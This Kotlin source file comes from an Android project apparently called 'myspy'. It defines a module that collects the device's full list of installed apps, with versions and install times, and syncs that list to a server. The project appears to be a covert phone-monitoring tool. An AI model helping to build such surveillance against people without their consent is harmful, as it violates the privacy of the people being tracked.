package com.myspy.android.modules.apps

import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.util.Log
import com.myspy.android.data.local.db.entities.AppEntity
import com.myspy.android.data.repository.AppsRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Apps Monitoring Module
 * Monitors installed applications on the device
 *
 * @author Michael KOJDL
 * @version 1.0.0
 */
class AppsModule(
    private val context: Context,
    private val repository: AppsRepository,
    private val scope: CoroutineScope
) {
    companion object {
        private const val TAG = "AppsModule"
    }

    private var isRunning = false
    private var lastCollectionTime = 0L

    /**
     * No special permissions needed for basic app list
     */
    fun hasPermissions(): Boolean = true

    /**
     * Start monitoring apps
     */
    fun start() {
        if (isRunning) {
            Log.d(TAG, "AppsModule already running")
            return
        }

        Log.i(TAG, "Starting AppsModule")
        isRunning = true

        // Collect installed apps immediately
        collectInstalledApps()
    }

    /**
     * Stop monitoring apps
     */
    fun stop() {
        if (!isRunning) return

        Log.i(TAG, "Stopping AppsModule")
        isRunning = false
    }

    /**
     * Sync collected data to server
     */
    suspend fun syncData(): Result<Int> {
        Log.d(TAG, "Syncing apps data to server")
        return repository.syncToServer()
    }

    /**
     * Get count of unsynced apps
     */
    suspend fun getUnsyncedCount(): Int {
        return repository.getUnsyncedCount()
    }

    /**
     * Refresh app list (call periodically or when needed)
     */
    fun refreshAppList() {
        if (!isRunning) return

        val currentTime = System.currentTimeMillis()
        // Don't refresh more than once per hour
        if (currentTime - lastCollectionTime < 3600000) {
            Log.d(TAG, "App list was recently refreshed, skipping")
            return
        }

        collectInstalledApps()
    }

    /**
     * Collect all installed applications
     */
    private fun collectInstalledApps() {
        scope.launch(Dispatchers.IO) {
            try {
                Log.d(TAG, "Collecting installed applications")
                val packageManager = context.packageManager
                val appsList = mutableListOf<AppEntity>()

                val packages: List<PackageInfo> = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                    packageManager.getInstalledPackages(PackageManager.PackageInfoFlags.of(0))
                } else {
                    @Suppress("DEPRECATION")
                    packageManager.getInstalledPackages(0)
                }

                for (packageInfo in packages) {
                    try {
                        val appInfo = packageInfo.applicationInfo
                        val packageName = packageInfo.packageName
                        val appName = packageManager.getApplicationLabel(appInfo).toString()
                        val versionName = packageInfo.versionName ?: "Unknown"
                        val versionCode = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                            packageInfo.longVersionCode
                        } else {
                            @Suppress("DEPRECATION")
                            packageInfo.versionCode.toLong()
                        }

                        val isSystemApp = (appInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0
                        val installTime = packageInfo.firstInstallTime
                        val updateTime = packageInfo.lastUpdateTime

                        appsList.add(
                            AppEntity(
                                packageName = packageName,
                                appName = appName,
                                versionName = versionName,
                                versionCode = versionCode,
                                isSystemApp = isSystemApp,
                                installTime = installTime,
                                updateTime = updateTime,
                                synced = false
                            )
                        )
                    } catch (e: Exception) {
                        Log.w(TAG, "Error processing package: ${packageInfo.packageName}", e)
                    }
                }

                if (appsList.isNotEmpty()) {
                    repository.clearAndSaveAll(appsList)
                    lastCollectionTime = System.currentTimeMillis()
                    Log.i(TAG, "Collected ${appsList.size} installed applications (${appsList.count { !it.isSystemApp }} user apps)")
                } else {
                    Log.d(TAG, "No applications found")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error collecting installed applications", e)
            }
        }
    }

    /**
     * Check if specific app is installed
     */
    fun isAppInstalled(packageName: String): Boolean {
        return try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                context.packageManager.getPackageInfo(
                    packageName,
                    PackageManager.PackageInfoFlags.of(0)
                )
            } else {
                @Suppress("DEPRECATION")
                context.packageManager.getPackageInfo(packageName, 0)
            }
            true
        } catch (e: PackageManager.NameNotFoundException) {
            false
        }
    }

    /**
     * Get detailed info about specific app
     */
    suspend fun getAppInfo(packageName: String): AppEntity? {
        return try {
            val packageManager = context.packageManager
            val packageInfo = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                packageManager.getPackageInfo(packageName, PackageManager.PackageInfoFlags.of(0))
            } else {
                @Suppress("DEPRECATION")
                packageManager.getPackageInfo(packageName, 0)
            }

            val appInfo = packageInfo.applicationInfo
            val appName = packageManager.getApplicationLabel(appInfo).toString()
            val versionName = packageInfo.versionName ?: "Unknown"
            val versionCode = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                packageInfo.longVersionCode
            } else {
                @Suppress("DEPRECATION")
                packageInfo.versionCode.toLong()
            }

            val isSystemApp = (appInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0

            AppEntity(
                packageName = packageName,
                appName = appName,
                versionName = versionName,
                versionCode = versionCode,
                isSystemApp = isSystemApp,
                installTime = packageInfo.firstInstallTime,
                updateTime = packageInfo.lastUpdateTime,
                synced = false
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error getting app info for $packageName", e)
            null
        }
    }
}
